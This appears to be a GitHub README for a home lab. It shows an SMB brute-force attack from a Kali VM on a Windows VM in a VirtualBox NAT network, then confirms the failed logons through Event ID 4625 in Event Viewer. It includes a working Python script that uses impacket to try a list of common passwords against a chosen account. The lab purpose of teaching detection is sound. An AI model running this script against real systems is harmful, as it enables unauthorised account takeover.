# smb-brute-force
🚨 SMB Brute Force Script with Python (Internal Network)
This project demonstrates how to launch a brute force attack using the SMB protocol within a virtual internal network. It targets a Windows machine and verifies login failures via Event Viewer logs (Event ID 4625).

📌 About the Project
This project simulates a brute force attack using Python and SMB protocol between two virtual machines on the same NAT network in VirtualBox. It sends multiple login attempts to the Windows VM and verifies failed attempts through Event Viewer.

⚠️ This is for educational purposes only. Do not run this on unauthorized systems.

📡 What is SMB?
SMB (Server Message Block) is a network protocol mainly used for sharing files, printers, and other resources in a Windows environment. It allows applications to read/write to files and request services over a network.

In this project, we exploit the SMB login mechanism by sending multiple password attempts using Python.

⚙️ Setup Instructions
1. 🖥 Create a NAT Network
Open VirtualBox > Tools > Network > NAT Networks.

Click Create to make a new NAT network.
📸 ![image](https://github.com/user-attachments/assets/f06ff4b7-acc7-4ae7-87bb-cca64a2bf616)


2. 🖥 Assign NAT Network to VMs
Assign the newly created NAT network to both Windows and Kali Linux VMs via Settings > Network > Adapter 1 > Attached to: NAT Network.

📸 Screenshot Placeholder

3. 🔍 Find IP Addresses
On Windows, open Command Prompt and run:

bash
Copy
Edit
ipconfig
On Kali, run:

bash
Copy
Edit
ifconfig
Write down both IPs.
Example:

Windows IP: 10.0.2.4

Kali IP: 10.0.2.5

4. 🔐 Enable SMB on Windows
Search and open Windows Defender Firewall with Advanced Security.

Go to Inbound Rules.

Enable the following:

File and Printer Sharing (SMB-In)

File and Printer Sharing (Echo Request - ICMPv4-In)

📸 Screenshot Placeholder

🐍 SMB Brute Force Script
Create a Python script (attack.py) in Kali Linux:

python
Copy
Edit
from impacket.smbconnection import SMBConnection
import time

target_ip = input("Enter target IP address: ")
username = input("Enter username to brute force: ")

passwords = [
    "password123", "123456", "admin", "letmein", "qwerty",
    "welcome", "password1", "abc123", "12345678", "admin123"
]

for i, password in enumerate(passwords, 1):
    try:
        print(f"[{i}] Trying password: {password}")
        conn = SMBConnection(target_ip, target_ip)
        conn.login(username, password)
        print(f"\n[✔] SUCCESS: Password is '{password}'")
        break
    except Exception as e:
        print(f"[✘] Failed login with: {password} - {e}")
        time.sleep(1)
else:
    print("\n[!] All 10 password attempts failed.")
Install dependencies if not already available:

bash
Copy
Edit
pip install impacket
🚀 Running the Attack
On Kali VM:

bash
Copy
Edit
nano attack.py
# Paste the code and save it
python3 attack.py
Enter:

Victim's IP (e.g., 10.0.2.4)

Username to attack (e.g., Administrator)

📸 Screenshot Placeholder

The script will attempt 10 password logins over SMB.

📑 Verifying the Attack
On Windows VM:

Open Event Viewer from search.

Navigate to:

nginx
Copy
Edit
Windows Logs > Security
Look for Event ID: 4625, which indicates logon failures.

📸 Screenshot Placeholder

If the brute force worked, you will see 10 failed logon attempts matching the passwords used in the script.

🖼️ Screenshots
Organize these screenshots in your GitHub repo:

arduino
Copy
Edit
📁 screenshots/
├── nat-network.png
├── firewall-rules.png
├── kali-script-run.png
├── event-viewer-4625.png
Embed them like:

md
Copy
Edit
![NAT Network Setup](screenshots/nat-network.png)
⚠️ Disclaimer
This script is intended for educational and ethical hacking purposes only.
Do NOT use this on systems without explicit permission.
